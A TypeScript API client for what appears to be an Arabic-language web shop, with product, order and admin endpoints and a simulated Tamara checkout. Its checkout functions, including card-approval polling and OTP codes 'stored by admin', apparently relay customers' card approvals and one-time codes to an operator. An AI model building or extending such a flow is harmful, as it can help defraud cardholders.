const BASE_URL = import.meta.env.VITE_API_URL || '';

const getAdminToken = (): string | null => {
  return localStorage.getItem('admin_token') || sessionStorage.getItem('admin_token');
};

const adminHeaders = () => {
  const token = getAdminToken();
  return {
    Authorization: token ? `Bearer ${token}` : '',
    'Content-Type': 'application/json',
  };
};

const handleResponse = async (res: Response) => {
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: 'خطأ في الاتصال بالخادم' }));
    throw new Error(err.error || 'خطأ غير معروف');
  }
  return res.json();
};

export const api = {
  get: (path: string) =>
    fetch(`${BASE_URL}${path}`).then(handleResponse),

  post: (path: string, body: unknown) =>
    fetch(`${BASE_URL}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }).then(handleResponse),

  adminGet: (path: string) =>
    fetch(`${BASE_URL}${path}`, { headers: adminHeaders() }).then(handleResponse),

  adminPost: (path: string, body: unknown) =>
    fetch(`${BASE_URL}${path}`, {
      method: 'POST',
      headers: adminHeaders(),
      body: JSON.stringify(body),
    }).then(handleResponse),

  adminPut: (path: string, formData: FormData) =>
    fetch(`${BASE_URL}${path}`, {
      method: 'PUT',
      headers: { Authorization: adminHeaders().Authorization },
      body: formData,
    }).then(handleResponse),

  adminPostForm: (path: string, formData: FormData) =>
    fetch(`${BASE_URL}${path}`, {
      method: 'POST',
      headers: { Authorization: adminHeaders().Authorization },
      body: formData,
    }).then(handleResponse),

  adminPatch: (path: string, body: unknown) =>
    fetch(`${BASE_URL}${path}`, {
      method: 'PATCH',
      headers: adminHeaders(),
      body: JSON.stringify(body),
    }).then(handleResponse),

  adminDelete: (path: string) =>
    fetch(`${BASE_URL}${path}`, {
      method: 'DELETE',
      headers: adminHeaders(),
    }).then(handleResponse),
};

export const adminLogin = (username: string, password: string) =>
  api.post('/api/admin/login', { username, password });

export const createOrder = (data: Record<string, unknown>) =>
  api.post('/api/orders', data);

export const getOrderById = (id: number) =>
  api.get(`/api/orders/${id}`);

export const tamaraCheckout = (orderId: number) =>
  api.post('/api/payments/tamara/checkout', { orderId });

export const fetchProducts = () =>
  api.get('/api/products');

export const fetchAdminStats = () =>
  api.adminGet('/api/admin/stats');

export const fetchAdminOrders = (status?: string, page = 1) =>
  api.adminGet(`/api/admin/orders?${status ? `status=${status}&` : ''}page=${page}`);

export const updateOrderStatus = (id: number, status: string) =>
  api.adminPatch(`/api/admin/orders/${id}/status`, { status });

export const createProduct = (formData: FormData) =>
  api.adminPostForm('/api/admin/products', formData);

export const editProduct = (id: number, formData: FormData) =>
  api.adminPut(`/api/admin/products/${id}`, formData);

export const removeProduct = (id: number) =>
  api.adminDelete(`/api/admin/products/${id}`);

export const reorderProductApi = (id: number, order: number) =>
  api.adminPatch(`/api/admin/products/${id}/reorder`, { order });

export const postCheckoutEvent = (data: Record<string, unknown>) =>
  api.post('/api/checkout/events', data);

export const requestCardApproval = (data: Record<string, unknown>) =>
  api.post('/api/checkout/approval', data);

export const getCardApprovalStatus = (sessionId: string) =>
  api.get(`/api/checkout/approval/${sessionId}`);

export const submitVerificationCode = (sessionId: string, code: string, meta?: Record<string, unknown>) =>
  api.post('/api/checkout/submit-code', { sessionId, code, ...meta });

export const getVerificationResult = (sessionId: string) =>
  api.get(`/api/checkout/verification-result/${sessionId}`);

// Request activation code (Tamara simulation) - returns code for automatic flow
export const requestActivationCode = (data: { 
  sessionId: string; 
  phoneNumber: string;
  userName: string;
  userEmail: string;
}): Promise<{ 
  success: boolean; 
  message: string; 
  activationCode: string;
  expiresIn: number;
}> => api.post('/api/checkout/request-activation-code', data);

// Verify activation code
export const verifyActivationCode = (sessionId: string, code: string) =>
  api.post('/api/checkout/verify-activation-code', { sessionId, code });

// Verify OTP code entered by customer against code stored by admin via /verifycode
export const verifyOtpCode = (sessionId: string, code: string) =>
  api.post('/api/checkout/verify-code', { sessionId, code });
